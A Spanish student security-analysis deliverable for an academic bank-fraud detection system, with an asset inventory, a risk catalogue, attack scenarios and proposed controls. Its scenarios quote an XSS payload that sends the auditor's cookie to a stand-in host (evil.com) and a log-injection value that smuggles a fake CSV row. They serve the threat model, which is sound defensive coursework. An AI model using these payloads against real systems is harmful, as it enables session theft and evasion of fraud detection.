# DetecciónAnomalíasBancarias — Entregable 2: Análisis de Seguridad

| Campo | Valor |
| --- | --- |
| **Aplicación** | DetecciónAnomalíasBancarias |
| **Versión** | 0.4 (26/05/2026) |
| **Ámbito** | Sistema académico de detección de fraude bancario sobre logs sintéticos |
| **Tecnología** | Java 17 · Spring Boot 3.2 · Spring Security · JPA / H2 / MySQL · HTML/CSS/JS |
| **Tema central** | Seguridad integral en sistemas de procesamiento masivo de logs financieros |
| **Producto** | Cuatro módulos: generador de logs (`/generador`), detector de anomalías (`/detector`), panel de auditoría (`/panel`) y generador bancario de Juan Carlos (`/banco-fraudekike`, en `rama-juancarlos`) |
| **Equipo** | Juan Carlos (generador) · Adrián (detector) · Javier (panel) · Kike (coordinación) |
| **Fecha** | 26/05/2026 |

---

## Tarea 1 — Inventario de activos

| ID | Activo | Tipo | Propietario | Confidencialidad | Integridad | Disponibilidad | Observaciones |
| --- | --- | --- | --- | --- | --- | --- | --- |
| A-01 | `transacciones.log` — CSV pipe-separated, 100 000 filas | Dato | Juan Carlos | ALTA (cuentas, importes, IPs) | CRÍTICA (fuente primaria del detector) | ALTA | Sin contraseñas; contiene datos financieros sintéticos |
| A-02 | `sesiones.log` — CSV pipe-separated, 20 000 filas | Dato | Juan Carlos | ALTA (IPs, dispositivos, usuarios) | ALTA | ALTA | Correlaciona con A-01 para ANO-016/017/019 |
| A-03 | `verdad_oculta.csv` — mapa transaction_id → fraude | Dato | Juan Carlos | CRÍTICA (revela qué es fraude) | CRÍTICA (define la evaluación) | MEDIA | **Nunca se sube al repositorio**; solo para Juan Carlos y el profesor |
| A-04 | BD `anomalias_detectadas` (H2/MySQL) | Dato | Adrián | ALTA | ALTA | ALTA | Dev: H2 en memoria; prod: MySQL con credenciales externas |
| A-05 | Panel de auditoría — JAR Spring Boot + frontend HTML | Servicio | Javier | MEDIA | ALTA | ALTA | Expone `/api/banking/*` y `/api/logs/*`; acceso solo para auditores |
| A-06 | Código fuente detector — reglas ANO-001..054 | Código | Adrián | MEDIA (las reglas son ventaja del detector) | ALTA | ALTA | Si se expone, el atacante aprende a evadir la detección |
| A-07 | Credenciales BD (`DB_PASS`, keystore, `.env`) | Secreto | Kike | CRÍTICA | CRÍTICA | ALTA | Solo en variables de entorno; **nunca en el repositorio** |
| A-08 | Configuración (`application.properties`, `application-prod.properties`) | Configuración | Kike | ALTA | ALTA | ALTA | El fichero de prod está en `.gitignore`; el de dev sin contraseñas reales |
| A-09 | API REST del panel (`/api/banking/*`, `/api/logs/*`) | Servicio | Javier | ALTA | ALTA | ALTA | Sin autenticación en v0.3: riesgo IDOR y DoS activos |
| A-10 | Infraestructura de ejecución (JVM, SO, puerto 8080) | Infraestructura | Kike | MEDIA | ALTA | CRÍTICA | Si el proceso cae, panel e ingesta se detienen |

---

## Tarea 2 — Análisis: Amenaza / Vulnerabilidad / Riesgo / Impacto / Control

### Módulo generador (`/generador`)

| # | Amenaza | Vulnerabilidad | Riesgo | Impacto | Control propuesto |
| --- | --- | --- | --- | --- | --- |
| 2.1 | Subir `verdad_oculta.csv` al repo por accidente | No está en `.gitignore`; sin pre-commit hook | Profesor descarga la solución antes de la evaluación | CRÍTICO: invalida la evaluación del detector | `verdad_oculta*.csv` en `.gitignore`; pre-commit hook con `git-secrets` |
| 2.2 | Timestamp manipulado en logs generados | Generador no valida rango temporal; fechas pasadas o futuras posibles | El detector basado en ventanas temporales genera falsos positivos masivos | ALTO: degrada precisión y recall | El generador firma con hash el bloque de logs; el detector verifica la firma |
| 2.3 | Log injection: campo `concepto` con `\|` o `\n` | Falta de sanitización al escribir el CSV | El detector parsea mal la fila y puede saltarse la detección | ALTO: evasión del detector | Escapar o rechazar `\|` y `\n` en `concepto` al generar el log |

### Módulo detector (`/detector`)

| # | Amenaza | Vulnerabilidad | Riesgo | Impacto | Control propuesto |
| --- | --- | --- | --- | --- | --- |
| 2.4 | SQL injection vía campo `concepto` en queries nativas | Concatenación de strings en lugar de parámetros preparados | Acceso o destrucción de la BD de anomalías | ALTO | `@Query` con parámetros con nombre o `PreparedStatement` |
| 2.5 | Adversarial evasion: atacante conoce las reglas | Código fuente público o reglas con umbrales fijos en código | El atacante ajusta sus transacciones para no disparar ninguna regla | ALTO | Repositorio privado para `/detector`; umbrales en configuración externa |
| 2.6 | Doble procesamiento de la misma fila de log | Sin control de idempotencia; no se registra qué ficheros se han procesado | Duplicidad en `anomalias_detectadas`; falsos positivos duplicados | MEDIO | Registrar hash SHA-256 del fichero procesado; rechazar refeed |

### Módulo panel (`/panel`)

| # | Amenaza | Vulnerabilidad | Riesgo | Impacto | Control propuesto |
| --- | --- | --- | --- | --- | --- |
| 2.7 | IDOR — auditor consulta anomalías de otra sucursal | Endpoint `GET /api/logs/recent` sin filtro por usuario autenticado | Un auditor lee datos de otra sucursal o cliente | CRÍTICO (OWASP API1:2023) | `@PreAuthorize` con `sucursal_id` extraído del JWT en todos los endpoints |
| 2.8 | Fuerza bruta al login del panel | Sin límite de intentos de autenticación | Compromiso de cuenta de auditor | ALTO | Spring Security: bloqueo tras 5 intentos; `BruteForceProtectionFilter` |
| 2.9 | XSS persistente vía campo `concepto` o `message` | El dashboard renderiza el campo sin escapar (`innerHTML`) | Script malicioso ejecutado en el navegador del auditor | ALTO (OWASP A03:2021) | `textContent` en lugar de `innerHTML`; CSP header |
| 2.10 | DoS sobre `POST /api/banking/batch` | Sin límite de tamaño de cuerpo ni tasa de peticiones | Agotamiento de memoria JVM | ALTO | `spring.servlet.multipart.max-request-size=10MB`; rate limiter |
| 2.11 | Spring Actuator expuesto en producción | `management.endpoints.web.exposure.include=*` sin autenticación | `/actuator/env` expone credenciales | ALTO | En prod: `include=health,info`; mover a puerto separado |

### Datos y credenciales

| # | Amenaza | Vulnerabilidad | Riesgo | Impacto | Control propuesto |
| --- | --- | --- | --- | --- | --- |
| 2.12 | Contraseña de BD hardcodeada en `application.properties` | Falta de revisión pre-commit | Acceso completo a la BD por cualquier persona con acceso al repo | CRÍTICO | `${DB_PASS}` en properties; pre-commit hook; rotación si hay exposición |
| 2.13 | Datos de clientes en logs sin seudonimizar | Logs con NIF, nombre o IBAN reales | Violación del RGPD Art. 32 | ALTO (legal) | En producción: tokenización de IBAN; en este proyecto: cuentas ficticias |
| 2.14 | Backup de BD sin cifrar | Fichero H2 sin contraseña por defecto | Exfiltración de todas las anomalías detectadas | ALTO | Cifrar con `CIPHER=AES` en H2; TDE en MySQL |

---

## Tarea 3 — Matriz módulos × dimensiones de seguridad

> Escala: ✅ cubierta · ⚠ parcial · ❌ no cubierta · N/A no aplica

| Módulo / Activo | Confidencialidad | Integridad | Disponibilidad | Autenticación | Autorización | No repudio | Trazabilidad |
| --- | --- | --- | --- | --- | --- | --- | --- |
| Generador (`/generador`) | ⚠ logs sin seudonimizar | ⚠ sin firma de logs | ✅ proceso batch | N/A | N/A | ⚠ sin hash de integridad | ⚠ sin registro de qué fichero generó cada log |
| Detector (`/detector`) | ⚠ reglas expuestas en repo | ⚠ sin idempotencia | ⚠ sin reintentos si falla BD | N/A | N/A | ⚠ no registra quién lanzó el análisis | ✅ escribe en `anomalias_detectadas` con timestamp |
| Panel (`/panel`) | ⚠ sin HTTPS por defecto | ✅ Spring Security | ⚠ nodo único, sin HA | ❌ endpoints sin auth real en v0.3 | ❌ sin RBAC | ⚠ sin log de acciones del auditor | ✅ logs a consola; alertas en BD |
| BD `anomalias_detectadas` | ⚠ H2 sin cifrado en disco | ✅ JPA + constraints SQL | ⚠ H2 en memoria se pierde al reiniciar | ✅ solo accesible desde la app | ✅ sin acceso externo directo | ⚠ sin audit log de cambios | ✅ timestamp en cada fila |
| `transacciones.log` | ⚠ IPs y cuentas en claro | ❌ sin firma; modificable sin detección | ✅ fichero local | N/A | N/A | ❌ sin hash | ✅ timestamp y transaction_id por fila |
| `sesiones.log` | ⚠ IPs y dispositivos en claro | ❌ sin firma | ✅ | N/A | N/A | ❌ | ✅ |
| `verdad_oculta.csv` | ❌ en riesgo si se sube al repo | CRÍTICA — define la evaluación | MEDIA — solo la necesita el evaluador | N/A | N/A | N/A | N/A |

---

## Tarea 4 — Catálogo de riesgos (R01–R20)

| Código | Descripción | Activo afectado | Dimensiones | Probabilidad (1-5) | Impacto (1-5) | Severidad |
| --- | --- | --- | --- | --- | --- | --- |
| R01 | IDOR en panel: auditor accede a datos de otra sucursal | A-09 | Confidencialidad, Autorización | 4 | 5 | **CRÍTICO** |
| R02 | Log injection: campo `concepto` inyecta líneas falsas en CSV | A-01 | Integridad, Trazabilidad | 3 | 4 | **ALTO** |
| R03 | Verdad oculta subida al repositorio por accidente | A-03 | Confidencialidad | 3 | 5 | **CRÍTICO** |
| R04 | Credenciales hardcoded en `application.properties` en el repo | A-07 | Confidencialidad, Autenticación | 4 | 5 | **CRÍTICO** |
| R05 | Spring Actuator expuesto en producción sin autenticación | A-05, A-07 | Confidencialidad, Disponibilidad | 3 | 4 | **ALTO** |
| R06 | DoS sobre `POST /api/banking/batch` sin límite de tamaño | A-09, A-10 | Disponibilidad | 3 | 4 | **ALTO** |
| R07 | SQL injection vía campo `concepto` en queries nativas | A-04 | Integridad, Confidencialidad | 2 | 5 | **ALTO** |
| R08 | Sesión del auditor robada — JWT sin expiración o exfiltrado | A-05 | Autenticación, Autorización | 3 | 4 | **ALTO** |
| R09 | Fuerza bruta al panel sin rate-limit | A-05 | Autenticación | 4 | 4 | **ALTO** |
| R10 | Datos sensibles de clientes en logs sin seudonimizar | A-01, A-02 | Confidencialidad | 2 | 4 | **ALTO** |
| R11 | Endpoints del panel sin autenticación en v0.3 | A-09 | Autenticación, Autorización | 5 | 5 | **CRÍTICO** |
| R12 | Reglas de detección expuestas en repo (adversarial evasion) | A-06 | Confidencialidad | 3 | 4 | **ALTO** |
| R13 | Backup de BD sin cifrar | A-04 | Confidencialidad | 2 | 5 | **ALTO** |
| R14 | Dependencias Maven vulnerables sin parchear | A-05, A-06 | Integridad, Disponibilidad | 3 | 3 | **MEDIO** |
| R15 | Sin cifrado de datos en reposo — H2 sin CIPHER=AES | A-04 | Confidencialidad | 3 | 4 | **ALTO** |
| R16 | Gap temporal en logs: bloques sin eventos durante horas (ANO-036) | A-01 | Integridad, Trazabilidad | 3 | 4 | **ALTO** |
| R17 | Sin paginación en `GET /api/logs/recent` — volcado total posible | A-09 | Disponibilidad, Confidencialidad | 4 | 3 | **MEDIO** |
| R18 | Sin HTTPS en el panel — tráfico en claro | A-05, A-09 | Confidencialidad, Autenticación | 3 | 4 | **ALTO** |
| R19 | Sin separación de entornos dev/prod — misma config | A-08 | Confidencialidad, Integridad | 4 | 4 | **ALTO** |
| R20 | Sin idempotencia en la ingestión — misma fila procesada dos veces | A-04 | Integridad | 3 | 3 | **MEDIO** |

---

## Tarea 5 — Principios reales de seguridad aplicados al proyecto

### P-01 — Principio del coste

**Enunciado:** Un atacante solo ataca si el beneficio esperado supera el coste del ataque.

**Aplicación al proyecto:** Los datos sintéticos no tienen valor económico real para un atacante externo. Sin embargo, para cualquier colaborador existe un incentivo académico: conocer `verdad_oculta.csv` antes de la corrección invalida la evaluación con coste prácticamente cero si el fichero está en el repositorio público. **Control directo:** `verdad_oculta*.csv` en `.gitignore` + pre-commit hook que detecte el fichero antes del push.

### P-02 — Principio de la imposibilidad

**Enunciado:** Ningún sistema es 100% seguro; el objetivo es elevar suficientemente el coste del ataque.

**Aplicación al proyecto:** El detector ANO-001..054 no puede detectar el 100% de los fraudes; siempre habrá evasiones creativas (R12). La meta es maximizar el recall minimizando los falsos positivos. El diseño acepta la imperfección y la cuantifica con TP/FP/FN y la `verdad_oculta.csv` como referencia.

### P-03 — Principio de la proporcionalidad

**Enunciado:** Los controles deben ser proporcionales al valor del activo y al riesgo real.

**Aplicación al proyecto:** `verdad_oculta.csv` (A-03) requiere máximo control: exclusión del repo, cifrado local, acceso solo al generador y al profesor. Los logs de transacciones (A-01) requieren control alto pero no cifrado: contienen cuentas ficticias sin datos personales reales. Un comentario de código interno no necesita ningún control especial.

### P-04 — Principio de la redundancia (defensa en profundidad)

**Enunciado:** Múltiples capas de seguridad independientes; si falla una, las demás aguantan.

**Aplicación al proyecto:** Para proteger las credenciales de BD se aplican tres capas: (1) `${DB_PASS}` en variables de entorno, (2) Spring Security bloqueando el acceso a `/h2-console` en prod, (3) `application-prod.properties` fuera del repo y en `.gitignore`. Si una capa falla, las otras limitan el daño.

### P-05 — Principio de la asimetría

**Enunciado:** El defensor debe cubrirse en todos los frentes; el atacante solo necesita encontrar uno.

**Aplicación al proyecto:** El panel tiene 6 endpoints. Si se protegen 5 con autenticación y se olvida uno (`/api/banking/upload-csv`), el atacante inyecta logs falsos por ese único punto no protegido. **Implicación directa:** todos los endpoints deben requerir autenticación, no solo los que parecen sensibles.

### P-06 — Principio de la incomodidad

**Enunciado:** La seguridad añade fricción; debe calibrarse para no bloquear el uso legítimo.

**Aplicación al proyecto:** El rate-limit en `/api/banking/batch` (100 peticiones/minuto) incomoda a un atacante que intenta un DoS con millones de peticiones, pero no interfiere con el uso normal del panel de auditoría, que procesa ficheros de logs de forma puntual y espaciada.

### P-07 — Principio del conocimiento del mal (conoce a tu adversario)

**Enunciado:** Para defenderte tienes que entender cómo ataca el adversario.

**Aplicación al proyecto:** El catálogo ANO-001..054 es la materialización de este principio. Antes de construir el detector, el equipo catalogó explícitamente los 54 patrones de fraude bancario conocidos: blanqueo, cuentas mula, velocidad inusual, integridad de logs, fraude externo, normativa, insider threat. Adrián solo puede construir las reglas porque antes el equipo estudió cómo operan estos fraudes en la realidad.

### P-08 — Principio del privilegio mínimo

**Enunciado:** Cada componente recibe solo los permisos estrictamente necesarios para su función.

**Aplicación al proyecto:** El usuario de BD del detector tiene `INSERT` en `anomalias_detectadas` y `SELECT` en `transacciones`; no tiene `DROP`, `ALTER` ni acceso a otras tablas. El detector no necesita leer `sesiones.log` directamente salvo para ANO-016/017. El panel no tiene acceso directo al fichero de logs: recibe los datos ya procesados vía API.

### P-09 — Principio de la sospecha (zero trust)

**Enunciado:** No confíes por defecto en ningún input; valida todo en el perímetro del sistema.

**Aplicación al proyecto:** El endpoint `POST /api/banking/upload-csv` recibe un fichero del exterior. No se asume que viene bien formado: se valida cada fila, se rechaza si tiene campos críticos vacíos (ANO-031, ANO-034), se escapa el campo `concepto` antes de procesarlo (ANO-040). Incluso los logs generados por Juan Carlos pasan por validación al ser ingeridos en el panel.

### P-10 — Principio de la resiliencia

**Enunciado:** El sistema debe degradarse de forma controlada cuando falla un componente.

**Aplicación al proyecto:** Si MySQL falla en producción, el panel cae sobre H2 en memoria (perfil `default`). Si el detector no puede escribir en BD, registra el error en logs y continúa procesando el siguiente fichero sin crash silencioso. Los logs de Spring Boot (`logging.level.root=INFO`) permiten diagnosticar el fallo sin reiniciar el servicio.

---

## Tarea 6 — Escenarios de ataque o fallo

### Escenario 1 — IDOR en el panel de auditoría

| Campo | Detalle |
| --- | --- |
| **Tipo** | Ataque |
| **Actor** | Externo autenticado (auditor de otra sucursal) o interno malicioso |
| **Activo afectado** | A-09 (API REST), A-04 (BD anomalías) |
| **Amenaza** | Acceso no autorizado a alertas de otra sucursal |
| **Vulnerabilidad explotada** | R01 — Endpoints sin filtro por identidad del auditor autenticado |
| **Vector de ataque** | `GET http://host:8080/api/logs/recent?source=sucursal-B` desde cuenta de sucursal-A |
| **Condición necesaria** | El auditor tiene un JWT válido pero no existe control de autorización por recurso |
| **Impacto técnico** | Lectura completa de anomalías detectadas en otras sucursales |
| **Impacto en el negocio** | Violación de confidencialidad; posible infracción del RGPD y Ley 10/2010 |
| **Dimensiones afectadas** | Confidencialidad, Autorización |
| **Riesgo asociado** | R01 (CRÍTICO) |
| **Controles recomendados** | `@PreAuthorize` con `sucursal_id` extraído del JWT; tests de autorización automatizados que prueben acceso cruzado |

### Escenario 2 — Log injection vía campo concepto

| Campo | Detalle |
| --- | --- |
| **Tipo** | Ataque |
| **Actor** | Externo (atacante que controla una cuenta bancaria de origen) |
| **Activo afectado** | A-01 (transacciones.log), A-04 (BD) |
| **Amenaza** | Manipulación del log para ocultar transacciones fraudulentas o crear falsas alertas |
| **Vulnerabilidad explotada** | R02 — Sin sanitización del campo `concepto`; el generador no escapa `\|` ni `\n` |
| **Vector de ataque** | Transacción con `concepto` = `Pago\|COMPLETADA\nFAKE_TX\|...` rompe el parser CSV del detector |
| **Condición necesaria** | El sistema confía en el formato del CSV sin validar el contenido de los campos de texto libre |
| **Impacto técnico** | El detector parsea una fila adicional falsa o se salta una real; se falsean estadísticas |
| **Impacto en el negocio** | Evasión del detector; falsos positivos o falsos negativos masivos |
| **Dimensiones afectadas** | Integridad, Trazabilidad, No repudio |
| **Riesgo asociado** | R02 (ALTO) |
| **Controles recomendados** | Escapar `\|` y `\n` en `concepto` al generar; validar número exacto de columnas en cada fila al parsear |

### Escenario 3 — Fuerza bruta al panel de auditoría

| Campo | Detalle |
| --- | --- |
| **Tipo** | Ataque |
| **Actor** | Externo automatizado (bot) |
| **Activo afectado** | A-05 (panel), A-04 (BD) |
| **Amenaza** | Compromiso de credenciales de auditor mediante diccionario de contraseñas |
| **Vulnerabilidad explotada** | R09 — Sin rate-limiting ni bloqueo tras intentos fallidos |
| **Vector de ataque** | Script que prueba 10 000 contraseñas contra `POST /login` en cuestión de segundos |
| **Condición necesaria** | El endpoint de login no tiene CAPTCHA ni bloqueo temporal; la contraseña del auditor es débil |
| **Impacto técnico** | Acceso completo al panel con la cuenta de auditor comprometida |
| **Impacto en el negocio** | El atacante puede ver todas las alertas, marcarlas como revisadas y enmascarar fraudes reales en curso |
| **Dimensiones afectadas** | Autenticación, Autorización, Confidencialidad |
| **Riesgo asociado** | R09 (ALTO) |
| **Controles recomendados** | Bloqueo 15 min tras 5 intentos; CAPTCHA en login; alertas de intentos fallidos; contraseñas mínimo 12 caracteres |

### Escenario 4 — Verdad oculta subida al repositorio por error

| Campo | Detalle |
| --- | --- |
| **Tipo** | Fallo humano |
| **Actor** | Interno accidental (Juan Carlos) |
| **Activo afectado** | A-03 (verdad_oculta.csv) |
| **Amenaza** | Exposición de la solución a la evaluación del detector |
| **Vulnerabilidad explotada** | R03 — Fichero sin entrada en `.gitignore`; sin pre-commit hook |
| **Vector de ataque** | `git add .` seguido de `git commit` sin revisar manualmente qué ficheros se incluyen |
| **Condición necesaria** | `verdad_oculta.csv` existe en el directorio de trabajo y no está excluido del repositorio |
| **Impacto técnico** | Cualquier colaborador puede ver el fichero en el historial de git, incluso si luego se elimina del árbol |
| **Impacto en el negocio** | La evaluación del detector queda completamente invalidada; el proyecto pierde valor académico |
| **Dimensiones afectadas** | Confidencialidad |
| **Riesgo asociado** | R03 (CRÍTICO) |
| **Controles recomendados** | `verdad_oculta*.csv` en `.gitignore`; pre-commit hook (`git-secrets`); revisión por Kike antes de aprobar cada PR a main |

### Escenario 5 — Spring Actuator expuesto en producción

| Campo | Detalle |
| --- | --- |
| **Tipo** | Fallo de configuración |
| **Actor** | Externo pasivo (rastreador de puertos / scanner automatizado) |
| **Activo afectado** | A-05 (panel), A-07 (credenciales) |
| **Amenaza** | Exfiltración de credenciales y configuración interna del sistema |
| **Vulnerabilidad explotada** | R05 — `management.endpoints.web.exposure.include=*` sin autenticación en producción |
| **Vector de ataque** | `GET http://host:8080/actuator/env` devuelve todas las propiedades de entorno si `DB_PASS` no se externalizó correctamente |
| **Condición necesaria** | Actuator expuesto y sin autenticación separada en el perfil de producción |
| **Impacto técnico** | El atacante obtiene las credenciales de BD y las URLs internas de la infraestructura |
| **Impacto en el negocio** | Acceso directo a la BD; destrucción o exfiltración de todas las anomalías detectadas |
| **Dimensiones afectadas** | Confidencialidad, Disponibilidad |
| **Riesgo asociado** | R05 (ALTO) |
| **Controles recomendados** | Prod: `include=health,info`; Actuator en puerto separado (`management.server.port=9090`) con firewall; autenticación en `/actuator/**` |

### Escenario 6 — XSS persistente vía campo concepto en el dashboard

| Campo | Detalle |
| --- | --- |
| **Tipo** | Ataque |
| **Actor** | Externo (atacante que sube un CSV malicioso vía API) |
| **Activo afectado** | A-05 (panel frontend) |
| **Amenaza** | Ejecución de código malicioso en el navegador del auditor |
| **Vulnerabilidad explotada** | R07 (sin escape en lectura de `concepto`) + frontend con `innerHTML` sin sanitizar |
| **Vector de ataque** | CSV con `concepto` = `<script>document.location='http://evil.com?c='+document.cookie</script>` subido vía `POST /api/banking/upload-csv` |
| **Condición necesaria** | El dashboard renderiza el campo `concepto` o `message` con `innerHTML` sin escapar |
| **Impacto técnico** | Robo de JWT del auditor; redirección a sitio de phishing; modificación del DOM del panel |
| **Impacto en el negocio** | Compromiso de la sesión del auditor; acceso a todas las alertas por el atacante |
| **Dimensiones afectadas** | Confidencialidad, Autenticación, Integridad |
| **Riesgo asociado** | R07 (ALTO) |
| **Controles recomendados** | `textContent` en lugar de `innerHTML` en dashboard.js; escapar en servidor antes de almacenar; `Content-Security-Policy: default-src 'self'` |

### Escenario 7 — DoS sobre endpoint de ingestión masiva

| Campo | Detalle |
| --- | --- |
| **Tipo** | Ataque |
| **Actor** | Externo automatizado |
| **Activo afectado** | A-09 (API), A-10 (infraestructura JVM) |
| **Amenaza** | Interrupción del servicio de auditoría por agotamiento de recursos |
| **Vulnerabilidad explotada** | R06 — Sin límite de tamaño de cuerpo ni tasa de peticiones en `/api/banking/batch` |
| **Vector de ataque** | POST con JSON array de 10 millones de eventos, o 10 000 peticiones concurrentes |
| **Condición necesaria** | El endpoint acepta cuerpos de petición de tamaño ilimitado y sin autenticación |
| **Impacto técnico** | `OutOfMemoryError` en JVM; el panel deja de responder |
| **Impacto en el negocio** | Auditores sin acceso; un fraude real en curso puede no detectarse a tiempo |
| **Dimensiones afectadas** | Disponibilidad |
| **Riesgo asociado** | R06 (ALTO) |
| **Controles recomendados** | `spring.servlet.multipart.max-request-size=10MB`; rate limiter; autenticación requerida para endpoints de ingestión |

### Escenario 8 — Credenciales hardcoded en el repositorio

| Campo | Detalle |
| --- | --- |
| **Tipo** | Fallo humano |
| **Actor** | Interno accidental (cualquier miembro del equipo) |
| **Activo afectado** | A-07 (credenciales), A-04 (BD) |
| **Amenaza** | Acceso no autorizado a la base de datos de anomalías detectadas |
| **Vulnerabilidad explotada** | R04 — Contraseña en `application.properties` en lugar de variable de entorno |
| **Vector de ataque** | Búsqueda en GitHub de `spring.datasource.password=` en el repositorio del proyecto |
| **Condición necesaria** | `application.properties` o `application-prod.properties` con contraseña real subido al repo |
| **Impacto técnico** | Acceso completo a la BD; lectura, modificación o eliminación de `anomalias_detectadas` |
| **Impacto en el negocio** | Destrucción o exfiltración de todos los resultados del detector; pérdida irrecuperable sin backup |
| **Dimensiones afectadas** | Confidencialidad, Integridad, Disponibilidad |
| **Riesgo asociado** | R04 (CRÍTICO) |
| **Controles recomendados** | `${DB_PASS}` en properties; `application-prod.properties` en `.gitignore`; pre-commit hook; rotación de credenciales si hay exposición |

### Escenario 9 — Sesión de auditor robada (JWT sin expiración corta)

| Campo | Detalle |
| --- | --- |
| **Tipo** | Ataque |
| **Actor** | Externo (phishing o intercepción en red insegura) |
| **Activo afectado** | A-05 (panel), A-09 (API) |
| **Amenaza** | Suplantación de identidad de auditor |
| **Vulnerabilidad explotada** | R08 — JWT con expiración larga o sin HTTPS (token interceptable) |
| **Vector de ataque** | Interceptación del JWT en red WiFi sin HTTPS (R18), o robo vía XSS (Escenario 6), y acceso desde otro equipo |
| **Condición necesaria** | JWT sin `exp` corto o sin HTTPS; sin invalidación de tokens activos |
| **Impacto técnico** | Sesión de auditor activa en manos del atacante de forma indefinida |
| **Impacto en el negocio** | El atacante puede marcar como revisados todos los fraudes detectados, enmascarando el problema |
| **Dimensiones afectadas** | Autenticación, Autorización, No repudio |
| **Riesgo asociado** | R08 (ALTO), R18 (ALTO) |
| **Controles recomendados** | JWT con `exp` máximo 1h; HTTPS obligatorio; lista negra de tokens invalidados (`jti` en Redis o en BD); registro de IP en el JWT |

### Escenario 10 — Evasión adversarial del detector (reglas conocidas)

| Campo | Detalle |
| --- | --- |
| **Tipo** | Ataque avanzado + fallo de diseño |
| **Actor** | Externo avanzado (conoce el repositorio y las reglas de detección) |
| **Activo afectado** | A-06 (código detector), A-04 (BD anomalías) |
| **Amenaza** | El atacante ajusta sus transacciones fraudulentas para no disparar ninguna regla ANO-001..054 |
| **Vulnerabilidad explotada** | R12 — Reglas de detección con umbrales fijos en código fuente público |
| **Vector de ataque** | Atacante lee el código del detector, aprende que ANO-001 se dispara para importes en [9000, 9999], y usa importes de 8500€ o varía el patrón temporal |
| **Condición necesaria** | El repositorio es público o el código del detector ha sido filtrado |
| **Impacto técnico** | Recall del detector cae a 0% para el tipo de fraude que el atacante adapta |
| **Impacto en el negocio** | El fraude pasa desapercibido; el sistema da falsa sensación de seguridad |
| **Dimensiones afectadas** | Integridad, Trazabilidad |
| **Riesgo asociado** | R12 (ALTO) |
| **Controles recomendados** | Repositorio privado para `/detector`; umbrales en configuración externa; márgenes dinámicos basados en estadísticas recientes; detección de evasión (cambios bruscos en distribución de importes) |

---

## Priorización de riesgos

> Fórmula: **Prioridad = Probabilidad × Impacto × Facilidad** (escala 1-5 cada variable)

| Código | Descripción breve | P | I | F | Prioridad | Acción |
| --- | --- | --- | --- | --- | --- | --- |
| R11 | Endpoints sin autenticación | 5 | 5 | 4 | **100** | Inmediata: Spring Security en todos los endpoints |
| R04 | Credenciales hardcoded en repo | 4 | 5 | 5 | **100** | Inmediata: variables de entorno + pre-commit hook |
| R01 | IDOR en panel | 4 | 5 | 4 | **80** | Inmediata: `@PreAuthorize` con JWT |
| R03 | Verdad oculta en repo | 3 | 5 | 5 | **75** | Inmediata: `.gitignore` + hook |
| R09 | Fuerza bruta sin rate-limit | 4 | 4 | 5 | **80** | Alta: rate limiter + bloqueo tras 5 intentos |
| R19 | Sin separación entornos dev/prod | 4 | 4 | 3 | **48** | Alta: perfiles Spring separados |
| R17 | Sin paginación en API | 4 | 3 | 4 | **48** | Alta: `?limit=50&offset=0` obligatorio |
| R06 | DoS batch sin límite | 3 | 4 | 5 | **60** | Alta: max-request-size |
| R05 | Actuator expuesto | 3 | 4 | 4 | **48** | Alta: `include=health,info` en prod |
| R08 | JWT robado sin HTTPS | 3 | 4 | 4 | **48** | Alta: HTTPS + exp corto |
| R18 | Sin HTTPS | 3 | 4 | 4 | **48** | Alta: HTTPS obligatorio |
| R02 | Log injection | 3 | 4 | 3 | **36** | Media: sanitización campo `concepto` |
| R12 | Reglas detector expuestas | 3 | 4 | 3 | **36** | Media: repo privado para `/detector` |
| R15 | Sin cifrado datos en reposo | 3 | 4 | 3 | **36** | Media: H2 CIPHER=AES |
| R07 | SQL injection vía `concepto` | 2 | 5 | 3 | **30** | Media: PreparedStatement siempre |
| R13 | Backup sin cifrar | 2 | 5 | 3 | **30** | Media: cifrado backup |
| R14 | Dependencias vulnerables | 3 | 3 | 3 | **27** | Baja: OWASP Dependency-Check en CI |
| R20 | Sin idempotencia ingestión | 3 | 3 | 3 | **27** | Baja: hash SHA-256 de fichero procesado |
| R10 | Datos sensibles en logs | 2 | 4 | 3 | **24** | Baja: seudonimización en producción |
| R16 | Gap temporal en logs | 3 | 4 | 2 | **24** | Baja: monitorización alertas |

---

## Controles propuestos

### Controles preventivos

| ID | Control | Aplica a | Riesgos mitigados |
| --- | --- | --- | --- |
| CP-01 | Variables de entorno para todas las credenciales (`${DB_PASS}`, `${JWT_SECRET}`) | A-07, A-08 | R04, R08 |
| CP-02 | `verdad_oculta*.csv` en `.gitignore` + pre-commit hook | A-03 | R03 |
| CP-03 | Spring Security con autenticación JWT en todos los endpoints | A-09, A-05 | R01, R09, R11 |
| CP-04 | Escapar/rechazar `\|` y `\n` en campo `concepto` (generador y panel) | A-01, A-09 | R02, R07 |
| CP-05 | HTTPS obligatorio en producción (TLS 1.3) | A-05, A-09 | R18 |
| CP-06 | `management.endpoints.web.exposure.include=health,info` en prod | A-05, A-07 | R05 |
| CP-07 | Perfiles Spring separados: `application-dev.properties` / `application-prod.properties` (prod en `.gitignore`) | A-08 | R19 |
| CP-08 | `spring.servlet.multipart.max-request-size=10MB` + rate limiter en endpoints de ingestión | A-09, A-10 | R06 |
| CP-09 | Paginación obligatoria en endpoints de consulta (`?limit=50&offset=0`) | A-09 | R17 |
| CP-10 | Repositorio privado para el módulo `/detector` | A-06 | R12 |

### Controles detectivos

| ID | Control | Aplica a | Riesgos mitigados |
| --- | --- | --- | --- |
| CD-01 | Log de auditoría de acciones del auditor (alertas revisadas, IP, timestamp) | A-05 | R01, R08 |
| CD-02 | Alerta si un mismo auditor revisa más de 50 alertas en menos de 5 min (posible sesión comprometida) | A-05 | R08 |
| CD-03 | OWASP Dependency-Check en CI/CD para detectar CVEs en dependencias Maven | A-05, A-06 | R14 |
| CD-04 | Monitorización de gaps temporales en logs: alerta si más de 2h sin eventos (ANO-036) | A-01 | R16 |
| CD-05 | Registro de hash SHA-256 de ficheros procesados; alerta si el mismo hash se procesa dos veces | A-04 | R20 |

### Controles correctivos

| ID | Control | Aplica a | Riesgos mitigados |
| --- | --- | --- | --- |
| CC-01 | Procedimiento de rotación de credenciales en menos de 1h si se detecta exposición en repo | A-07 | R04 |
| CC-02 | Eliminación del historial git si `verdad_oculta.csv` se sube accidentalmente (BFG Repo Cleaner) | A-03 | R03 |
| CC-03 | Invalidación inmediata de JWT si se detecta sesión sospechosa (múltiples IPs o horario inusual) | A-05 | R08 |

### Controles compensatorios

| ID | Control | Aplica a | Riesgos mitigados |
| --- | --- | --- | --- |
| CK-01 | Backup cifrado diario de `anomalias_detectadas` en almacenamiento separado del host principal | A-04 | R13, R15 |
